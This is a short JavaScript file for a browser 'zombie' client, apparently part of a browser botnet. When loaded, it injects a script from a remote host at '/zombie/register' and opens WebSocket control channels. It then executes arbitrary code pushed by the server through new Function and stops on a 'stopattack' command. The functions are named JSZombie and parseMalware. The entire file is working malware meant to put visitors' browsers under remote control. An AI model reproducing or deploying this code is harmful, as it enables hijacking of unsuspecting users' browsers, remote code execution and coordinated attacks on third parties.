

(function($){

var zombie;

function JSZombie(ip,port,handler){
		this.handler = handler;
		this.makeContact=function(){
			var script =document.createElement('script');
			script.type = 'text/javascript';
			script.src = 'http://'+ip+':'+port+'/zombie/register';
			script.id = "zombieconnect";
			$("head:first").append(script);

			this.solo_socket = WS4Redis({
				uri:'ws://'+ip+':'+port+'/ws/solo?subscribe-session',
				receive_message: handler,
				heartbeat_msg: "--heartbeat--",
			});

			this.broadcast_socket = WS4Redis({
				uri:'ws://'+ip+':'+port+'/ws/broadcastcontrol?subscribe-broadcast',//&publish-broadcast&echo',
				receive_message: handler,
				heartbeat_msg : "--heartbeat--",
			});
			//console.log(script.innerText);
			//this.zombieId = parseInt(JSON.parse(script.innerText)['zombieid']);

			//$("#zombieconnect").remove();
		}

		this.execute = function(script){
				code = new Function('args','window',script['code']);
				killHander = code(script['args'],window);
				this.kill = killHander;
		}



}


function parseMalware(msg){
	var msgJson = JSON.parse(msg);
	if(msgJson.hasOwnProperty('code')==true){
		zombie.execute(msgJson);

	}
	if(msgJson.hasOwnProperty('stopattack')==true){
		zombie.kill();
	}

}

zombie = new JSZombie(host,port,parseMalware);
zombie.makeContact();
console.log("LOG");
/*
$(function(){
	zombie = new JSZombie(host,port,parseMalware);
	zombie.makeContact();
});*/

})(jQuery);
